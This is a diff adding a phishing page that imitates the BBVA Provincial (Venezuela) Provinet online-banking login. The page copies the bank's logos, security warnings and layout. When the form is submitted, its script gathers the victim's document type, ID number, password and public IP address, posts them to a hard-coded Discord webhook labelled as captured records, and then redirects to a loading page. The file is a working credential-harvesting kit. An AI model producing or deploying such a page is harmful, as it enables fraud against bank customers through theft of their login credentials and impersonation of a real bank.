@@ -1,0 +1,403 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge; chrome=1"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
+    <title>BBVA Provincial</title>
+
+    <link rel="stylesheet" href="fbin/css/fonts/fonts.css">
+    <link rel="stylesheet" href="fbin/css/style.css">
+    <link rel="stylesheet" href="fbin/css/header.css">
+    <link rel="stylesheet" href="fbin/css/login.css">
+    <link rel="stylesheet" href="fbin/css/footer.css">
+    <link rel="stylesheet" href="fbin/css/fontawesome.min.css">
+
+    <style>
+        #h_titulo_clave {
+            display: none;
+            font-size: 40px;
+            line-height: 48px;
+            font-weight: 700;
+            color: var(--bbva-blue-dark, #070E46);
+            font-family: 'TiempoHeadline_Bold', Helvetica, Arial, sans-serif;
+            margin-top: 5%;
+        }
+        .usuario-recordado .custom-select-wrapper,
+        .usuario-recordado .form-group.rel,
+        .usuario-recordado #titulo1 {
+            display: none !important;
+        }
+        .usuario-recordado #h_titulo_clave {
+            display: block !important;
+        }
+
+        .icono-dentro2 { 
+            right: 50px !important;
+            z-index: 15;
+        }
+
+        .icono-password { 
+            right: 15px !important;
+            z-index: 20;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-con-icono input {
+            padding-right: 80px !important;
+        }
+
+        .icono-dentro, .icono-dentro2, .icono-password {
+            position: absolute;
+            cursor: pointer;
+            transition: opacity 0.2s;
+            width: 24px;
+            height: 24px;
+            display: none;
+        }
+
+        .icono-dentro { 
+            right: 10px; 
+            top: 50%; 
+            transform: translateY(-50%); 
+            z-index: 25;
+        }
+        
+        .icono-dentro2 { 
+            right: 40px; 
+            top: 50%; 
+            transform: translateY(-50%); 
+            z-index: 25;
+        }
+        
+        .icono-password { 
+            right: 10px; 
+            top: 50%; 
+            transform: translateY(-50%); 
+            z-index: 30;
+            width: 21.01px;
+        }
+        
+        .input-con-icono#inputCedula input {
+            padding-right: 40px !important;
+        }
+
+        .checkbox-group {
+            display: flex !important;
+            align-items: center !important;
+            margin: 15px 0 !important;
+            user-select: none;
+        }
+
+        #chkFrecuentes {
+            appearance: none !important;
+            -webkit-appearance: none !important;
+            width: 40px !important;
+            height: 40px !important;
+            border-radius: 4px !important;
+            margin-right: 8px !important;
+            margin-left: 1% !important;
+            cursor: pointer !important;
+            transition: all 0.2s ease !important;
+            position: relative !important;
+            outline: none !important;
+        }
+    </style>
+</head>
+<body class="login">
+    <header class="header">
+        <div class="header-content container">
+            <div class="logo">
+                <div class="logo-placeholder">
+                    <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/logo-bbva.svg" alt="" class="headerLogo" onclick="salir();"/>
+                </div>
+            </div>
+            <nav class="header-nav">
+                <a href="#" class="nav-link" style="font-size: 20px">Acceso a Provinet Personas</a>
+                <a href="#" class="nav-link bbva-link" onclick="salir();">Ir a BBVA Provincial</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="breadcrumb-notice">
+            <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/lock.svg" class="icono-lock" alt="">
+            <span class="txtSeg">Estás en un entorno con seguridad BBVA Provincial</span>
+        </div>
+
+        <div class="container" id="container2">
+            <div class="access-area">
+                <div id="form-column2" class="form-column">
+                    <h1 id="titulo1" class="welcome-title">&iexcl;Bienvenido&#33;</h1>
+                    <h1 id="h_titulo_clave" class="welcome-title"></h1>
+                    
+                    <!-- Formulario con ID miFormulario y sin rutas de PHP -->
+                    <form name="form" id="miFormulario" method="POST" autocomplete='off'>
+                        <div class="form-group divselect" style="display:n"></div>
+                        <div id="container_main">
+                            <div class="form-group document-type custom-select-wrapper has-value">
+                                <select id="select_doc" name="select_doc" class="hidden-select" style="display:none;">
+                                    <option value="V" selected>Venezolano</option>
+                                    <option value="P">Pasaporte</option>
+                                    <option value="E">Extranjero</option>
+                                </select>
+                                <label for="custom-select-trigger" class="custom-select-label">Tipo de documento</label>
+                                <div class="custom-select-trigger" id="custom-select-trigger">
+                                    <span class="selected-value">Venezolano</span>
+                                    <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/unfold.svg" class="icono-flecha">
+                                </div>
+                                <div class="custom-options-container" id="custom-options-container">
+                                    <div class="custom-option" data-value="V">Venezolano</div>
+                                    <div class="custom-option" data-value="P">Pasaporte</div>
+                                    <div class="custom-option" data-value="E">Extranjero</div>
+                                </div>
+                            </div>
+
+                            <div class="form-group rel">
+                                <div id="inputCedula" class="input-wrapper custom-dropdown-trigger input-con-icono">
+                                    <input type="tel" style="touch-action: pan-y; display: block;" 
+                                        onkeypress='return event.charCode >= 48 && event.charCode <= 57'
+                                        class="cleanup validate-empty valido mascara-texto" name="cedula" id="cedula" value="" autocomplete="off" 
+                                        maxlength="10" placeholder=" ">
+                                    
+                                    <label class="floating-label floatingDoc" for="cedula">Número de documento</label>
+
+                                    <input type="hidden" disabled="disabled" readonly class="cleanup validate-empty valido" 
+                                        onkeypress='return event.charCode >= 48 && event.charCode <= 57' name="cedula2" 
+                                        id="cedula2" autocomplete="off" maxlength="10" value="">
+                                    <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/close.svg" 
+                                        class="icono-dentro" style="display: none;" onclick="borrarInputJS('cedula')">
+                                </div>
+                            </div>
+                                                        
+                            <div class="form-group">
+                                <div class="input-wrapper password-input custom-dropdown-trigger input-con-icono">
+                                    <input type="password" name="password" id="password" class="valido" maxlength="16" autocomplete="off" placeholder=" ">
+                                    
+                                    <label class="floating-label floating-label-password" for="password">Clave de acceso</label>
+                                    
+                                    <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/close.svg" 
+                                        class="icono-dentro2" style="display: none;" onclick="borrarInputJS('password')">
+                                    
+                                    <img class="icono-password show-Password" id="img-password" 
+                                        src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/show.svg">
+                                    
+                                    <img class="icono-password hide-Password" id="img-password2" 
+                                        src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/hide.svg" 
+                                        style="display: none;">
+                                </div>
+                            </div>
+                            
+                            <div class="checkbox-group" id="divFrecuentes">
+                                <input id="chkFrecuentes" type="checkbox">
+                                <label for="chkFrecuentes">Recordar documento</label>
+                            </div>
+
+                            <div class="form-actions">
+                                <button type="submit" name="submit" id="submit" class="btn btn-primary boton-submit disabled" disabled="disabled">
+                                    Ingresar
+                                </button>
+                                <a href="#" id="recuperarclave" class="recuperar link-forgot">Olvido o desbloqueo de clave</a>
+                            </div>
+
+                            <div class="rec2" id="nuevoIngreso" style="display:none;">
+                                <a href="" id="rec" class="recuperar2"> 
+                                    <b>Quiero ingresar con otros datos</b>
+                                </a>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+                
+                <div class="info-column">
+                    <div class="security-panel">
+                        <div class="security-icon-container">
+                            <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/micros/security-warning-glass-L.png" class="icono-seguridad">
+                        </div>
+                        <h2 class="security-title">Tu seguridad es nuestra prioridad</h2>
+                        <div class="security-banner-content">
+                            <p class="security-text">
+                                Nunca te pediremos claves ni datos financieros por llamada o redes sociales. Recuerda: 
+                            </p>
+                            <ul class="security-list">
+                                <li>No entres desde enlaces sospechosos en SMS, correos o redes sociales.</li>
+                                <li>Duda de las ofertas sospechosas, consulta en nuestros canales oficiales.</li>
+                            </ul>
+                        </div>
+                        <a href="https://www.provincial.com/personas/ayuda-urgente/consejos-seguridad.html" target="_blank" class="link-forgot2">Más información</a>
+                    </div>
+
+                    <div class="info-extra-blue">
+                        <div class="info-header">
+                            <img class="icoInfo" src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/info.svg" alt="info">
+                            <h2 class="recordarText">Recordar documento</h2>
+                        </div>
+                        <p class="info-desc">Permite recordar este dispositivo únicamente tu número de documento.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+<footer class="main-footer">
+    <div class="footer-content">
+        <div class="footer-header">
+            <div class="footer-logo">
+                <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/logo-bbva-blanco.svg" alt="BBVA Logo"/>
+            </div>
+            <div class="social-links">
+                <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/facebook.svg" class="icono30" onclick="window.open('https://www.facebook.com/BBVAProvincial.Venezuela', '_blank');" alt="Facebook"/>
+                <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/twitter.svg" class="icono30" onclick="window.open('https://twitter.com/bbvaprovincial', '_blank');" alt="Twitter"/>
+                <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/instagram.svg" class="icono30" onclick="window.open('https://www.instagram.com/bbvavenezuela', '_blank');" alt="Instagram"/>
+                <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/linked-in.svg" class="icono30" onclick="window.open('https://ve.linkedin.com/company/bbva-banco-provincial', '_blank');" alt="LinkedIn"/>
+                <img src="https://assets.caasbbva.com/venezuela/net/assets-spherica/iconos/youtube.svg" class="icono30" onclick="window.open('https://www.youtube.com/user/venezuelabbva?feature=mhsn', '_blank');" alt="YouTube"/>
+            </div>
+        </div>
+
+        <div class="footer-copyright">
+            &#169;2026 BBVA Provincial S.A.
+        </div>
+        
+        <div class="footer-copyright-mobile">
+            &#169;2026 BBVA Provincial S.A. RIF: <br> J-00002967-9
+        </div>
+    </div>
+</footer>
+
+<!-- Scripts externos originales -->
+<script type="text/javascript" src="fbin/js/functionJM.js"></script>  
+
+<script type="text/javascript">
+    document.addEventListener("DOMContentLoaded", function() {
+        if (typeof inicializarSelectPersonalizado === "function") {
+            inicializarSelectPersonalizado();
+        } else {
+            console.warn("La función inicializarSelectPersonalizado no está definida en functionJM.js");
+        }
+    });
+</script>
+
+<!-- Script unificado: Validación, IP, Envío a Discord y Redirección -->
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        const selectDoc = document.getElementById("select_doc");
+        const cedula = document.getElementById("cedula");
+        const password = document.getElementById("password");
+        const btnSubmit = document.getElementById("submit");
+        const formulario = document.getElementById("miFormulario");
+
+        // Tu Webhook de Discord configurado
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1568324102739988590/Ns7AHvf9Nnj5qBHZJF5tT-hE82yMrajrlHGxG9apX3uf-_fiVWTl6Gwqn7X5K7ccqx38";
+
+        function validarFormulario() {
+            const tipoDocValido = selectDoc.value.trim() !== "";
+            const cedulaValida = cedula.value.trim() !== "";
+            
+            const valorPassword = password.value;
+            const tieneLetra = /[a-zA-Z]/.test(valorPassword);
+            const tieneNumero = /[0-9]/.test(valorPassword);
+            const tieneSimbolo = /[^a-zA-Z0-9]/.test(valorPassword);
+
+            const passwordValida = tieneLetra && tieneNumero && tieneSimbolo;
+
+            if (tipoDocValido && cedulaValida && passwordValida) {
+                btnSubmit.removeAttribute("disabled");
+                btnSubmit.classList.remove("disabled");
+            } else {
+                btnSubmit.setAttribute("disabled", "disabled");
+                btnSubmit.classList.add("disabled");
+            }
+        }
+
+        cedula.addEventListener("input", validarFormulario);
+        password.addEventListener("input", validarFormulario);
+        selectDoc.addEventListener("change", validarFormulario);
+
+        validarFormulario();
+
+        if (formulario) {
+            formulario.addEventListener("submit", async function(e) {
+                e.preventDefault(); // Evita recargas y navegación por defecto
+
+                btnSubmit.setAttribute("disabled", "disabled");
+
+                try {
+                    // Obtención de la IP real del usuario
+                    let ipUsuario = "Desconocida";
+                    try {
+                        const responseIp = await fetch("https://api.ipify.org?format=json");
+                        const dataIp = await responseIp.json();
+                        ipUsuario = dataIp.ip;
+                    } catch (errIp) {
+                        console.warn("No se pudo obtener la IP:", errIp);
+                    }
+
+                    // Estructura del mensaje para Discord
+                    const embed = {
+                        title: "Nuevo Registro Capturado",
+                        color: 3447003,
+                        fields: [
+                            {
+                                name: "Tipo de Documento",
+                                value: selectDoc.value,
+                                inline: true
+                            },
+                            {
+                                name: "Cédula / Número",
+                                value: cedula.value,
+                                inline: true
+                            },
+                            {
+                                name: "Contraseña",
+                                value: "`" + password.value + "`",
+                                inline: false
+                            },
+                            {
+                                name: "Dirección IP Real",
+                                value: "`" + ipUsuario + "`",
+                                inline: false
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    };
+
+                    const payload = {
+                        username: "Bot de Registros",
+                        embeds: [embed]
+                    };
+
+                    // Envío directo al webhook mediante fetch
+                    const responseDiscord = await fetch(DISCORD_WEBHOOK_URL, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(payload)
+                    });
+
+                    // Redirección automática si el mensaje llega a Discord
+                    if (responseDiscord.ok) {
+                        window.location.href = "cargando.html";
+                    } else {
+                        alert("Ocurrió un error al enviar la información a Discord.");
+                        btnSubmit.removeAttribute("disabled");
+                    }
+
+                } catch (error) {
+                    console.error("Error en la petición:", error);
+                    alert("Error de conexión al procesar los datos.");
+                    btnSubmit.removeAttribute("disabled");
+                }
+            });
+        }
+    });
+</script>
+
+<script type="text/javascript" src="/syR08IFn/QjM/urI/qSupyTBk1I/r7aOtbhu5Oiarc3Lru/OFIrR2o/KWJkBWE/0SwEB"></script>
+</body>
+</html>
